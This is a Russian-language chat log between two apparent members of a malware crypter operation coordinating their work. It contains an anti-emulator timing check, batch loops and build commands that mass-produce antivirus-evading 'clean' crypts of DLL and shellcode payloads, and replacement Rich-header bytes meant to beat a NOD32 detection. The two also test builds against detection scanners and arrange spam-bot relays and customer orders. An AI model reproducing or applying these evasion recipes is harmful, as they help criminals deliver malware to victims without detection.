[14.09.21 10:56:11] basil:		Но вот не повлияет ли это на тайминги? Или лучше все таки взять указатель?
[14.09.21 10:56:14] elroy:		Прикольный велосипед)))
[14.09.21 10:56:27] basil:		Ну в моем стиле. Сам понимаешь
[14.09.21 10:56:33] basil:		Вот хочу посоветоваться
[14.09.21 10:56:44] elroy:		Вообще-то повлияет
[14.09.21 10:57:46] elroy:		1) погугли как преобразовать
2) используй уж тогд а fPerfStep2 += 4096, например или еще какое-то значение
[14.09.21 10:57:59] elroy:		У double проблема со сложением, можно при сложении много потерять
[14.09.21 10:58:06] elroy:		Придумай метод с умножением
[14.09.21 10:58:11] elroy:		Похожый
[14.09.21 10:59:13] basil:		ок. хорошо. Такие же мероприятия , как я понял нужно будет еще с кодогенераторм проводить , там тожево многих местах производиться преобразование типов.
[14.09.21 10:59:18] basil:		А вот нельзя ли....
[14.09.21 11:00:13] basil:		Мне поподробнее рассказать что же это measure2 делает. Тогда я смогу понять что для него критично, а что нет. Моежт тогда мысль пойдет шибче...
[14.09.21 11:00:57] elroy:		Можно.
[14.09.21 11:00:59] elroy:		Расскажу
[14.09.21 11:01:09] elroy:		Но сейчас занят. Давай чуть позже
[14.09.21 11:01:49] basil:		Хороши. Кинь тогда в чат месседж, как посвободнее будешь. У меня в коде еще есть там над чем подумать
[14.09.21 11:24:32] elroy:		Давай обсудим
[14.09.21 11:25:01] basil:		Давай
[14.09.21 11:26:20] elroy:		Момент)
[14.09.21 11:28:33] elroy:		https://file.io/ReEaNArCesoW
[14.09.21 11:29:32] basil:		момент
[14.09.21 11:30:35] basil:		есть
[14.09.21 11:31:32] elroy:		Это утилита для тестирования алгоритма
[14.09.21 11:32:05] elroy:		Теперь давай по самому алгоритму
[14.09.21 11:32:20] elroy:		Если будешь вносить изменения, любые, сначала проверь утилитой
[14.09.21 11:32:30] basil:		ок
[14.09.21 11:33:40] elroy:		Идея такая
Сначала разогреватеся процессор, это делается циклом
```
for (double i = 0; i < 1024 * 1024 * 200; i++);
```
Нужно чтобы процессор вышел из энергосбережения
[14.09.21 11:33:59] basil:		не знал. интересно
[14.09.21 11:34:05] basil:		так а дальше?
[14.09.21 11:35:24] elroy:		Дальше идет опрос значения высокоточного таймера, это обычно модуль в чипсете или еще где-то, за пределами ЦП.
[14.09.21 11:35:45] basil:		__rdtsc()?
[14.09.21 11:36:06] elroy:		Этот таймер наращивается от нуля (от старта системы и с приростом, свойственным только платформе.
Нет, QueryPerformanceCounter
[14.09.21 11:36:33] elroy:		Сколько он растет за 1 секунду можно узнать запросом QueryPerformanceFrequency
[14.09.21 11:36:59] elroy:		Для нас его прирост не играет значения, там просто вызов
[14.09.21 11:38:11] elroy:		__rdtsc - это тоже таймер производительности, но он находится внутри цп, и собственно забирается инструкцией rdtsc (на асме), тут функция - это то, что реализует вызов и помещает результат
[14.09.21 11:38:52] elroy:		Т.е. получили два значения от двух таймеров разных по своей природе
[14.09.21 11:39:01] elroy:		И пошли считать ничто
[14.09.21 11:39:03] elroy:		for (long long i = 0; i < (102400 * rnd / 2); i++)
			if (!dQueryPerformanceFrequency(&li))
				break;
[14.09.21 11:39:49] elroy:		После пересчета снова полуили значения таймеров, получили сколько тиков для одного таймера длился пересчет и сколько тиков для другого таймера длилися пересчет
[14.09.21 11:40:32] elroy:		Затем снова повторили пересчет
[14.09.21 11:41:08] basil:		да вижу.
[14.09.21 11:41:11] basil:		А дальше?
[14.09.21 11:41:27] elroy:		Выспались 200 миллисекунд после пересчета
[14.09.21 11:41:38] elroy:		Затем повторили так 5 раз (константа там вынесена)
[14.09.21 11:41:45] elroy:		называется counter
[14.09.21 11:41:52] basil:		вижу
[14.09.21 11:42:09] elroy:		Когда 5 раз повторяли, все заносилось в массивы
[14.09.21 11:42:49] elroy:		Теперь проверили.
Нашли некоторое среднее для 5 измерений одного таймера, и другого
[14.09.21 11:44:34] elroy:		И тоге, там расчет идет, что *соотношение* значений таймеров должны отличаться минимум на 40% для каждого измерения
[14.09.21 11:45:26] elroy:		При этом погрешность должна быть больше 0.2% и меньеш 3%
Я не помню точно математику в этом цикле, но помоему так
[14.09.21 11:45:51] elroy:		Если идут где-то нарушения, цикл повторяется
[14.09.21 11:46:02] elroy:		Собственно, это и есть зависание
[14.09.21 11:46:55] elroy:		Идея тут проста, таймер высокоточный и таймер на цп не должны расходиться больше чем на 3 процента, но должны немного отличаться, если они разные (0.2 процента, с учетом ошибки вычислений)
[14.09.21 11:47:26] elroy:		При этом, никогда прогоны не должны быть одинаковыми, в многозадачной системе обычно мимнимум 40%
[14.09.21 11:47:35] elroy:		(из-за вытесняющей многозадачности)
[14.09.21 11:48:04] basil:		Т.е. я так понимаю, что в виртуальной машине скорость ее работы будет зависеть он ее загрузки а высокоточный таймер он берет с таймера хоста.  Поэтому и возникает расхождение. Я правильно понял?
[14.09.21 11:48:41] elroy:		Я выше написал идею. Нет, на вирт машине все же работает)
[14.09.21 11:49:02] elroy:		В эмуляторе АВ для таймера берется одно и то же значение
[14.09.21 11:49:18] basil:		Хорошо. сейчас еще раз перечитаю.
[14.09.21 11:49:18] elroy:		При этому, если идет эмуляция, то не учитывается среда
[14.09.21 11:49:41] basil:		надо вникнуть
[14.09.21 11:51:42] basil:		Вот еще вопрос. Тут заказчик написал  (по спам боту) говорит надо пересобрать с новыми прокладками. Я у него спросил к кому можно обратиться, он говорит к моно или elroy. Может подскажешь к кому по штату нужно написать?
[14.09.21 11:53:19] elroy:		Тебе надо знать ip сервера, а за прокладками можно к rocco, demetrius обратиться, сказать только что это спамбот, rocco знает (можешь сказать "как элрою делал").
[14.09.21 11:53:50] basil:		ок. Огромное спасибо
[14.09.21 11:56:28] elroy:		Проверить бы еще бота на динчеке
[14.09.21 11:56:37] elroy:		Ему навеное не только прокладки..
[14.09.21 11:57:35] basil:		сделаю конечно. Обычно я перед тем как бинарники передавать делаю еще линки на винчек
[14.09.21 11:57:38] basil:		динчек*
[14.09.21 15:18:15] elroy:		У нас пока детекты на билдмашине, за криптами БК обращаются сделать локально. Локально детекта почему-то нет, делается чистым
[14.09.21 15:18:28] elroy:		Пока меня не будет, придется тебе
[14.09.21 15:19:02] basil:		Хорошо. А нагрузка?
[14.09.21 15:19:11] elroy:		Ее скидывают
[14.09.21 15:19:15] basil:		И сколько их надо сделать?
[14.09.21 15:19:16] elroy:		Профиль бк
[14.09.21 15:19:22] elroy:		Сколько попросят
[14.09.21 15:19:26] elroy:		Сегодня два просили
[14.09.21 15:19:31] elroy:		Вчера ничего не просили
[14.09.21 15:19:38] elroy:		В пятницу кажись, просили 100
[14.09.21 15:19:45] basil:		100!!!!
[14.09.21 15:19:52] basil:		вот это я понимаю!
[14.09.21 15:20:02] elroy:		Могу дать скрипт с циклом, делает сколько надо )
[14.09.21 15:20:25] basil:		ну вприниципе такой скрипт и я могу написать
[14.09.21 15:20:35] basil:		главное чтобы чистыми были
[14.09.21 15:20:43] elroy:		Это скрипт на 60
```
@echo off
set /a x=0
:while
if %x% lss 60 (
  echo %x%
  set /a x+=1
  cmd.exe /c build --gen-exports yes --entropy-max-rdata 6.3 -s c:\temp\bk -p c:\temp\bk\l_dll_rndll_sw_64_p2_25_v65_02_09_21_logs_no.dll
  goto :while
)
```
[14.09.21 15:21:36] elroy:		Если что, детекты, делаешь тюнинг, там параметры code complexity и параметр процента xor
[14.09.21 15:22:08] elroy:		Я сейчас добавлю правки для сборки под vs 2022
[14.09.21 15:22:32] basil:		И еще к кому обращаться за нагрузкой?
[14.09.21 15:22:51] elroy:		Делаются чистые) лайфхак такой.
Она правда жутко не стабильная, если зависает, надо снимать с диспетчера
[14.09.21 15:23:01] elroy:		Сами придут, сами попросят
[14.09.21 15:23:03] elroy:		Еще достанут
[14.09.21 15:23:09] elroy:		Не беспокойся))
[14.09.21 15:23:31] basil:		Ну да... Собственно так и должно быть!
[14.09.21 15:24:06] basil:		Ветка bk?
[14.09.21 15:24:18] basil:		ghjabkm
[14.09.21 15:24:19] elroy:		Да, но develop
[14.09.21 15:24:20] basil:		профиль
[14.09.21 15:24:27] elroy:		develop_payload_bk
[14.09.21 15:24:31] elroy:		Обновлю ее
[14.09.21 15:24:32] basil:		ок
[14.09.21 15:25:02] basil:		завтра уходишь или в четверг?
[14.09.21 15:25:21] basil:		там вроде говрил что с 16 сентября
[14.09.21 15:25:31] elroy:		с 16
[14.09.21 15:25:44] elroy:		может вопорсы будут, ты бы потренировался
[14.09.21 15:27:37] basil:		да вроде все у меня пока работало. Правда на тестовых файлах. Я и после, наших мероприятий с "разлитием" нового шифрования по веткам, пробовал криптовать нагрузку тестовую из криптопанели. Все было в норме
[14.09.21 15:27:47] basil:		Ну на текущий момент
[14.09.21 15:27:59] elroy:		Радует)
[14.09.21 15:28:57] basil:		Поэтому .... Ну как бы..... Может ты зря волнуешься. Лучше не надо волноваться, как начнешь - все из рук валится. Сам понимаешь - аура. Я серьезно!
[14.09.21 15:29:18] basil:		Мысли - вешь материальная
[14.09.21 15:29:35] elroy:		)))
[14.09.21 15:29:36] basil:		Ты должен о пляже думать!
[14.09.21 15:29:53] elroy:		Не, какие пляжи....
[14.09.21 15:30:22] elroy:		Пещеры и ходы.
[14.09.21 15:30:23] basil:		Ну я не настаиваю, просто отдых тоже вешь важная.
[14.09.21 15:30:29] elroy:		Шутке год, а смешно)))
[14.09.21 15:31:02] basil:		Это ты про "сделай вход"?
[14.09.21 15:32:24] elroy:		Да
[14.09.21 15:32:56] basil:		ну да смешно было. Но про "живой криптер" было на мой взгляд смешнее
[14.09.21 15:33:04] basil:		Ну да ладно
[14.09.21 15:49:48] elroy:		Вот это еще сохрани к себе
[14.09.21 15:50:13] elroy:		```
build-vs2022.bat --gen-exports yes --stub 4 --entropy-max-rdata 6.0 --pack-prop-xor 68 -s c:\temp\bk --code-complexity 3,3,3,3,3 --pack-complexity 3,4,2,3,4 -p c:\temp\bk\dl_20_release_nologs_group_20_ver_1_38_x64_regsvr32.dll
```
[14.09.21 15:50:46] elroy:		Это парамтеры, делал с ними чистые сборки сегодня
[14.09.21 15:51:24] basil:		да. забрал
[14.09.21 15:54:28] basil:		да. еще просьба. Ссылка на vs2021 - потерял. Еще раз скинь пожалуйста
[14.09.21 16:01:09] elroy:		https://visualstudio.microsoft.com/vs/preview/#download-preview
[14.09.21 16:01:28] elroy:		Она работает 14 дней
[14.09.21 16:01:43] elroy:		Потом нужна активация только учетной записью
[14.09.21 16:01:50] elroy:		Скорее всего придется переставить
[14.09.21 16:01:58] elroy:		Просто будь готов ее переставить
[14.09.21 16:02:10] elroy:		Скачай оффлайн установщик по инструкции, как я скидывал
[14.09.21 16:02:25] basil:		ок
[14.09.21 16:13:15] elroy:		Вот еще кое что, запиши
[14.09.21 16:13:17] basil:		что то еще?
[14.09.21 16:13:23] elroy:		Да
[14.09.21 16:13:26] elroy:		Записывай)
[14.09.21 16:13:30] basil:		слушаю
[14.09.21 16:13:38] basil:		сейчас ручку возьмк
[14.09.21 16:14:00] elroy:		Ветка dev_vs2022_profile содержит изменения для сборки на 2022 студии, дополнительно там фикс InitializeWinAPI
[14.09.21 16:15:48] elroy:		Для крипта bk нужно сделать так:
```
git checkout dev_vs2022_profile
git pull
git checkout develop_payload_bk
git pull
git merge dev_vs2022_profile
```
Это касается любого профиля, которым надо криптовать по свежему. Но я пока не уверен в том, что надо слить это сейчас
[14.09.21 16:16:15] elroy:		Был просто тяжелый день) Делалось на ходу. ПО хорошему можно оттестить все и потом слить, елси нужно. Или там оставить
[14.09.21 16:16:26] basil:		а она еще и другие профили поддреживает - думал только develop
[14.09.21 16:16:40] basil:		jnkbxykj
[14.09.21 16:16:42] basil:		отлично
[14.09.21 16:16:47] elroy:		Все поддерживает, но не тестировалось)
[14.09.21 16:16:49] basil:		всмысле хорошо
[14.09.21 16:17:21] basil:		вот этим и займусь. Сейчаc переключусь с crt
[14.09.21 16:17:34] elroy:		Да, займись
[14.09.21 16:17:42] elroy:		Завтра протести
[14.09.21 16:17:48] elroy:		уже на 2022
[14.09.21 16:18:07] elroy:		Там еще вопрос, не зацепились ли профили 2019 из-за этого
[14.09.21 16:18:14] elroy:		Поэтому и не вливал
[14.09.21 16:19:14] elroy:		Не забывай про git pull, ветки может не освеженные.. Я писал, была проблема, например с веткой develop, там куда-то мои дополнения делись
[14.09.21 16:19:18] elroy:		Может глюк гита
[14.09.21 16:19:23] elroy:		Может просто ветку не освежил
[14.09.21 16:19:49] basil:		я понял .ок
[15.09.21 10:01:18] elroy:		Приветствую.
[15.09.21 10:01:32] basil:		Приветствую
[15.09.21 10:01:41] elroy:		Вот тебе для настроения:
```
 Привет. ШК стабы нужно чистить. Вчера работали 7 он спалился.
В иделае конечно твоим 2 работать или какой-нибудь похожий сделать. По ниму самые лучшие отзывы.
```
[15.09.21 10:02:16] basil:		"ШК" это что?
[15.09.21 10:02:35] basil:		shell code
[15.09.21 10:02:46] basil:		хорошо. понял
[15.09.21 10:04:06] basil:		У кого нагрузку можно взять для динчек?
[15.09.21 10:07:31] elroy:		Нагрузку для динчек, это как?
[15.09.21 10:08:16] basil:		ну я должен накрыть криптером. Потом полученный файл протестировать. Правильно?
[15.09.21 10:08:28] basil:		Ведь так же было?
[15.09.21 10:09:35] basil:		Или та тестовых проверять
[15.09.21 10:09:53] basil:		там же может на тестоввых не светиться а на боевой нагрузке светиться
[15.09.21 10:10:34] elroy:		Обычно да.. Смотря с какой целью нагрузка нужна. Если проверить функционал и базовые детекты, то я скидывал нагрузку тебе, целым архивом с исходниками. Я этим проверяю. Затем, если детектов нет и все работает, то беру нагрузку у мануэля, у него любая на выбор. Для bk можно wild написать
[15.09.21 10:11:56] basil:		хорошо. ок
[15.09.21 10:12:13] basil:		тогда на текущий момент на тестовой проверю
[15.09.21 10:12:45] elroy:		Мануэль написал, что то что я закриптовал сегодня - не работает
[15.09.21 10:12:58] elroy:		Я криптовал как раз с той веткой под 2022
[15.09.21 10:13:12] elroy:		Что-то наверное пошло не так, надо перепроверить
[15.09.21 10:13:51] basil:		я поставил себе 2022. У меня по крайней мере собирает. Ладно тогда еще отладчиком пройдусь
[15.09.21 10:14:03] basil:		ок
[15.09.21 10:14:35] elroy:		Закриптуй профилем rundll тестовый шеллкод, точка входа StartW, у него не заработало почему-то
[15.09.21 10:26:23] basil:		у меня вообще падение. Не собирает
[15.09.21 10:26:42] basil:		сейчас смоотрю где ошибка вылетает
[15.09.21 10:27:45] elroy:		Для 2022 скрипт нужен build-vs2022, с ним собираешь?
[15.09.21 10:28:12] basil:		да.
[15.09.21 10:28:22] elroy:		параметр --stub 4 нужен
[15.09.21 10:28:49] basil:		```
build-vs2022.bat --gen-exports yes --stub 4 --entropy-max-rdata 6.0 --pack-prop-xor 68 -s c:\temp\bk --code-complexity 3,3,3,3,3 --pack-complexity 3,4,2,3,4 -p C:/temp/helloworld_64_shellcode.bin
```
[15.09.21 10:29:14] basil:		нет. не --stub 4
[15.09.21 10:29:46] elroy:		--gen-exports - это сделать таблицу на основе исходной dll, обычно применимо для dll нагрузки, не для шеллкода
[15.09.21 10:29:52] elroy:		Шеллкод собирается иначе
[15.09.21 10:29:55] elroy:		Момент
[15.09.21 10:30:38] elroy:		```
build-vs2022.bat -sc 64 --stub 4 --entrypoint StartW -t dll --entropy-max-rdata 6.0 --pack-prop-xor 76 -s c:\temp -p C:\temp\sc_http_x64_dll.bin --code-complexity 3,3,3,3,3 --pack-complexity 3,4,2,3,4
```
[15.09.21 10:31:29] elroy:		надо указывать шеллкоду разрядность обязательно, -sc 64 или -sc 32, для rundll надо указывать entrypoint откуда запускается шеллкод
[15.09.21 10:36:27] basil:		так. уже лучше. собралось
[15.09.21 10:36:53] elroy:		Осталось запустить)
[15.09.21 10:38:29] basil:		точку входа тоже вижу
[15.09.21 10:40:16] basil:		тест положительно
[15.09.21 10:40:23] basil:		может боевую попробуем
[15.09.21 10:40:29] basil:		?
[15.09.21 10:49:06] elroy:		Я тоже проверил, положительно
[15.09.21 10:49:10] elroy:		Интересно
[15.09.21 10:49:29] elroy:		А боевую мы никак не проверим, только мануэль может
[15.09.21 10:49:39] elroy:		Он говорит, что крашится
[15.09.21 10:49:46] basil:		ну я его поприветствовал
[15.09.21 10:49:47] elroy:		В общем-то, запустить то можно
[15.09.21 10:49:55] elroy:		Отлично)
[15.09.21 10:49:58] basil:		но он пока не ответил
[15.09.21 10:50:01] elroy:		Возьми, попробуй)
[15.09.21 11:01:05] basil:		Он появился. Но опять куда-то пропал. Будем надеться, что в скорости появится
[15.09.21 11:18:24] elroy:		Я добавил тебе вкладку wild в панели
[15.09.21 11:19:06] basil:		мануэль ответил, что на нагрузка на других стабахх работает. Ну по крайней мере он так написал. Но пока образец не выслал
[15.09.21 11:19:21] basil:		а новая вкладка для кааких целей?
[15.09.21 11:19:41] elroy:		Это вкладка тестера wild
[15.09.21 11:20:25] basil:		я смотрю в группе, кстати говоря, криптер держит позиции
[15.09.21 11:20:28] elroy:		На ней файл
dl2_x64_20_408.dll - это bk

вообще там нужны до безумия сверх чистые крипты прочеканные и в авчеке и в денчеке, там смысл такой что я делаю сразу 2 крипта, уже рассказывал тебе, один аз них чекаю на денчеке, другой на авчеке, и тот что на авчеке я не отправляю заказчику, а удалаю. Вот как бы так сделать чтобы ты мне дал один крипт вот так проверенный

Можешь организовать как просит?
[15.09.21 11:20:39] basil:		по крайней мере пока...
[15.09.21 11:21:09] basil:		сейчас момент
[15.09.21 11:21:22] elroy:		(это его цитата)
[15.09.21 11:21:51] basil:		это про "сверхчитстыек крипты" цитата?
[15.09.21 11:21:57] elroy:		да
[15.09.21 11:22:25] basil:		ну давай займусь
[15.09.21 11:22:27] basil:		хорошо
[15.09.21 11:22:33] basil:		нагрузка есть?
[15.09.21 11:22:46] elroy:		dl2_x64_20_408.dll - это бк
[15.09.21 11:22:51] elroy:		На его вкладке
[15.09.21 11:23:27] basil:		вопрос еще один. На авчек проверенные - это же утилита? Правильно?
[15.09.21 11:24:18] basil:		Она вроде имеет использовать API динчек. Но получается  то тотже самый динчек!
[15.09.21 11:24:33] elroy:		Это сайт, avcheck.net, там статический скан делаешь
[15.09.21 11:24:47] basil:		а понял. Ок
[15.09.21 11:24:55] elroy:		Доступ же есть?)
[15.09.21 11:25:10] basil:		сейчас. момент
[15.09.21 11:25:21] basil:		да
[15.09.21 11:25:22] basil:		есть
[15.09.21 11:26:06] basil:		все нормально
[15.09.21 11:27:12] elroy:		ок0
[15.09.21 13:38:07] elroy:		Скажи, порверял вчера профили ?
[15.09.21 13:38:13] elroy:		Или сегодня
[15.09.21 13:39:00] basil:		Вчера нет. Сейчас с начала дня сижу со "сверхчистыми криптами"
[15.09.21 13:39:16] elroy:		Еще нет ни одного сверхчистого?
[15.09.21 13:40:26] basil:		есть почти чистый. nod32 только все "переживает". И детект от билда к билду скачет. И скачет каждый раз из-за char* nopWinApiFunc[]
[15.09.21 13:40:47] basil:		Я уже почти все поотключал , а он все никак
[15.09.21 13:41:50] basil:		Ну вот что это такой! Твою мать!
[15.09.21 13:42:28] elroy:		Он там по другой причине, я полагаю)
[15.09.21 13:42:52] basil:		и какова причина?
[15.09.21 13:43:47] elroy:		Он палит по рич заголовку. Я предполагаю просто)
[15.09.21 13:44:13] elroy:		Открой config.h в SolutionBuilder
И замени на это:
```
const unsigned char RichSign[] = {
	0xE6, 0x93, 0x67, 0x1D, 0xA2, 0xF2, 0x09, 0x4E, 0xA2, 0xF2, 0x09, 0x4E, 0xA2, 0xF2, 0x09, 0x4E,
	0xAB, 0x8A, 0x9A, 0x4E, 0x8C, 0xF2, 0x09, 0x4E, 0xC7, 0x94, 0x0C, 0x4F, 0xA0, 0xF2, 0x09, 0x4E,
	0xC7, 0x94, 0x0A, 0x4F, 0xA0, 0xF2, 0x09, 0x4E, 0xC7, 0x94, 0x0D, 0x4F, 0xB6, 0xF2, 0x09, 0x4E,
	0xA2, 0xF2, 0x08, 0x4E, 0xD6, 0xF2, 0x09, 0x4E, 0xC7, 0x94, 0x08, 0x4F, 0xB1, 0xF2, 0x09, 0x4E,
	0xC7, 0x94, 0x01, 0x4F, 0xA4, 0xF2, 0x09, 0x4E, 0xC7, 0x94, 0xF6, 0x4E, 0xA3, 0xF2, 0x09, 0x4E,
	0xC7, 0x94, 0x0B, 0x4F, 0xA3, 0xF2, 0x09, 0x4E, 0x52, 0x69, 0x63, 0x68, 0xA2, 0xF2, 0x09, 0x4E,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
```
[15.09.21 13:44:52] elroy:		Или на
[15.09.21 13:45:12] elroy:		```
const unsigned char RichSign[] = {
	0x54, 0x4B, 0x74, 0x45, 0x10, 0x2A, 0x1A, 0x16, 0x10, 0x2A, 0x1A, 0x16, 0x10, 0x2A, 0x1A, 0x16, 
	0x04, 0x41, 0x19, 0x17, 0x1A, 0x2A, 0x1A, 0x16, 0x04, 0x41, 0x1F, 0x17, 0x88, 0x2A, 0x1A, 0x16, 
	0x04, 0x41, 0x1E, 0x17, 0x02, 0x2A, 0x1A, 0x16, 0x42, 0x5F, 0x1F, 0x17, 0x35, 0x2A, 0x1A, 0x16, 
	0x42, 0x5F, 0x1E, 0x17, 0x03, 0x2A, 0x1A, 0x16, 0x42, 0x5F, 0x19, 0x17, 0x01, 0x2A, 0x1A, 0x16, 
	0x04, 0x41, 0x1B, 0x17, 0x19, 0x2A, 0x1A, 0x16, 0x10, 0x2A, 0x1B, 0x16, 0x78, 0x2A, 0x1A, 0x16, 
	0x46, 0x5F, 0x12, 0x17, 0x11, 0x2A, 0x1A, 0x16, 0x46, 0x5F, 0xE5, 0x16, 0x11, 0x2A, 0x1A, 0x16, 
	0x46, 0x5F, 0x18, 0x17, 0x11, 0x2A, 0x1A, 0x16, 0x52, 0x69, 0x63, 0x68, 0x10, 0x2A, 0x1A, 0x16
};
```
[15.09.21 13:45:40] basil:		может быть и так конечно. Но вот деттект постоянно на таблице импорта
[15.09.21 13:45:55] elroy:		А ты проверь)
[15.09.21 13:46:13] elroy:		Утром так шеллкод делал
[15.09.21 13:47:28] basil:		первый - нет
[15.09.21 13:49:17] basil:		и второй тоже нет
[15.09.21 14:02:33] basil:		вот уже лучше
[15.09.21 14:02:33] basil:		https://dyncheck.com/scan/id/fac184adb804e51b19dbc62eb60b0aa3
[15.09.21 14:03:12] basil:		тоже неплохо
[15.09.21 14:03:13] basil:		https://avcheck.net/id/sYDtf1allkaq
[15.09.21 14:13:34] basil:		Тут вопрос возник. Вот если меня попросят вручную закриптовать нагрузку , сами то (те кто просят) знают к какому типу нагрузки относится файл?
[15.09.21 14:17:06] elroy:		Обычно знают, можно спросить как они в панели криптуют
[15.09.21 14:18:08] basil:		Хорошо
[15.09.21 14:35:37] basil:		Уф.... Главное ребята - сердцем не стареть....
[15.09.21 14:35:59] elroy:		))
[15.09.21 14:36:14] elroy:		Как от детекта избавился?
[15.09.21 14:36:56] basil:		вот только эти 2 функции:
```
		"GetCommandLineA();\r\n",
		"CreateMenu();\r\n",
```
[15.09.21 14:37:12] basil:		остались в  char* nopWinApiFunc[]
[15.09.21 14:37:33] basil:		особенно как я смотрю его смущают всяккая работа с клавиатурой
[15.09.21 14:37:47] elroy:		Странно
[15.09.21 14:38:27] basil:		ну на текущий момент билды действительно "сверхчистые". Это будет пароль такой
[15.09.21 14:38:31] basil:		))
[15.09.21 14:39:02] elroy:		)
[15.09.21 14:39:33] basil:		ну этот криптер точно, как живой стал...
[15.09.21 14:39:42] basil:		очень своеобразно себя ведет
[15.09.21 14:39:57] elroy:		Я сейчас внесу правки в develop_payload_bk, это обновление - требование разработчиков бк, надо проверить будет
[15.09.21 14:40:44] elroy:		Хотя нет, сейчас проверю, потом внесу))
[15.09.21 14:40:50] elroy:		Просто обновишь тогда у себя
[15.09.21 14:41:00] basil:		ок
[15.09.21 14:41:03] elroy:		И надо все же попроверять ветки, актуализировать на билдмашине
[15.09.21 14:41:27] elroy:		*попроверять билдится ли 2019 студией с наложением ветки 2022
[15.09.21 14:42:07] basil:		а по поводу работы с jenkins к кому обращаться ?
[15.09.21 14:42:28] elroy:		А что с ним? Что именно?
[15.09.21 14:43:25] basil:		Да с ними то на сегодняшний момент все в порядке. Ноесли возникнет нужда, так сказать, пока тебя не будет
[15.09.21 14:44:16] elroy:		Темой криптеров руководят collin и orval, когда меня нет. С любыми вопросами к ним. Они могут тоже что-то требовать)
[15.09.21 14:45:11] basil:		ну я не же не против требований)))) С требованиями я всегда согласен)))
[15.09.21 14:45:15] basil:		Надо так надо
[15.09.21 14:46:59] elroy:		)
[15.09.21 15:24:36] basil:		Да иди же в отпуск наконец!!! Ну чего ты сидишь на работе?))))
[15.09.21 15:24:50] basil:		Ужас"!
[15.09.21 15:24:52] elroy:		Ахахах))))
[15.09.21 15:25:12] elroy:		Щас, профиль допроверяю, момент)
[15.09.21 15:25:32] basil:		брось каку!)))
[15.09.21 15:25:47] elroy:		Есть такая гадость, называется "технический долг", он копится изодня в день
[15.09.21 15:26:02] elroy:		Вот надо хоть критическое доделать
[15.09.21 15:26:38] basil:		Да не знаю какие контраргументы привести. Ну если считаешь что надо.....
[15.09.21 15:26:55] elroy:		Да, надо)
[15.09.21 15:27:17] elroy:		Сам потом ветку бк обнови у себя, протести и раскинь если работает в beta_*
[15.09.21 15:27:40] basil:		хорошо
[15.09.21 15:37:34] elroy:		Готово
[15.09.21 15:38:07] basil:		да вижу
[15.09.21 15:38:50] elroy:		Проверить можно тестом rundll, дополни его функцией
```
int PluginInit(HWND hWnd, HINSTANCE hInst, LPWSTR lpszCmdLine, int nCmdShow)
{
    size_t bufSize = snprintf(
        NULL, 0,
        "Three: HWND=0x%p HINSTANCE=0x%p LPWSTR=\"%ws\" int=%d",
        hWnd,
        hInst,
        lpszCmdLine,
        nCmdShow);
    char* charBuf = new char[bufSize];
    snprintf(
        charBuf, bufSize,
        "Three: HWND=0x%p HINSTANCE=0x%p LPWSTR=\"%ws\" int=%d",
        hWnd,
        hInst,
        lpszCmdLine,
        nCmdShow);
    MessageBoxA(0, charBuf, ":Three", MB_OK);
    delete[] charBuf;
    return 0;
}
```
И добавить в lib.def эту функцию
[15.09.21 15:40:26] elroy:		Для проверки закриптовать библиотеку вот так
```
.\build.bat --gen-exports yes -p C:\temp\rundll.dll -s c:\temp --entrypoint PluginInit=Gino
```
и вызвать вот так
```
rundll32 rundll_crypt_2021-09-15.18_33_33.dll,Gino
```
Gino - это для примера, новое имя.
Должен увидеть сообщение с текстом, содержащим Gino
[15.09.21 15:41:19] elroy:		Смысл доработки в том, что имя новое функции должно передаваться, вместо передаваемого оригинального параметра
[15.09.21 15:41:23] elroy:		Я не тестил, вызвало ли это дополнительный детект
[15.09.21 15:41:38] elroy:		Если _WSTR() вызывает - надо поменть
[15.09.21 15:41:42] elroy:		Но менять только в этой ветке
[15.09.21 15:42:37] basil:		момент
[15.09.21 15:43:02] basil:		так. Тестовый проект rundll.sln?
[15.09.21 15:43:13] elroy:		Да
[15.09.21 15:43:32] basil:		Хорошо. забрал
[15.09.21 15:44:10] basil:		Ну ? Ключ на старт?
[15.09.21 15:44:12] basil:		)))
[15.09.21 15:44:50] basil:		Не переживай. Я подправлю если где-то что -то не так...
[15.09.21 15:45:09] elroy:		Надеюсь)
[15.09.21 15:46:21] elroy:		Узнай еще у мартина насчет сервера для Ali (сервер для мейлбота, должны уже развернуть).
Еси готов, надо прокладки на него сделать и просили dll релиз, надо andy в жабе отдать
[15.09.21 15:47:35] basil:		Ну там не к мартину скорее вопрос rocco и demetrius этим занимались. Ну на сегодняшний день
[15.09.21 15:48:07] elroy:		Я просто знаю, что там мартин командует)
[15.09.21 15:48:17] elroy:		Именно самим софтом сервера
[15.09.21 15:48:33] elroy:		Просто никто кроме него развернуть софт не сможет
[15.09.21 15:48:48] basil:		ну хорошо. К мартину так к мартину. Это если опять заказчик не буддет загружен
[15.09.21 15:49:08] basil:		Все будет вери велл. Я уже 100 раз так делал)))
[15.09.21 15:49:20] basil:		Вернись главное. Буду ждать)))
[15.09.21 15:49:38] elroy:		Ок))
[15.09.21 15:49:51] elroy:		Ты не беспокойся, я еще заглядывать буду
[15.09.21 15:50:01] elroy:		Тут может зп на неделе дадут
[15.09.21 15:50:05] elroy:		Не откажусь)
[15.09.21 15:50:15] basil:		ну это святое дело
[15.09.21 15:50:45] basil:		Иногда хочется кушать . Иногда обычно бывает 3 раза в день...
[15.09.21 15:51:02] elroy:		Я так много не ему)
[15.09.21 15:51:06] elroy:		Но чай...
[15.09.21 15:51:13] basil:		Ну если появляться будешь - то хорошо.
[15.09.21 15:51:21] basil:		Будет приятно.
[15.09.21 15:51:47] basil:		А сейчас закрывай окошечко..... Выключай випиэнчик.....
[15.09.21 15:51:54] basil:		Я не гоню конечно....
[15.09.21 15:52:03] basil:		Но отдыхать тоже надо уметь
[15.09.21 15:52:19] basil:		Вообщем жду , надеюсь и верю
[15.09.21 15:53:18] elroy:		Твоя попытка прогнать меня прозвучала как поздравление с отпуском. Празднично так. Спасибо))
Я в индустрии больше 10 лет, и только вот второй раз за все время поздравили с отпуском)))
[15.09.21 15:53:50] basil:		Отдыхать надо уметь....
[15.09.21 15:54:00] elroy:		Это верно)
[15.09.21 15:54:05] basil:		Это не такая простачя задача, как может показаться
[15.09.21 15:54:26] basil:		Так что с наступающим тебя отпуском. Обязательно забери ЗП....
[15.09.21 15:54:37] elroy:		Канеш)
[15.09.21 15:55:23] basil:		ну ладно.... В общем , я попытался настроить тебя на позитив как мог. Отдыхай короче
[15.09.21 15:55:34] elroy:		Спасибо)))
[17.09.21 14:49:44] elroy:		Или тут
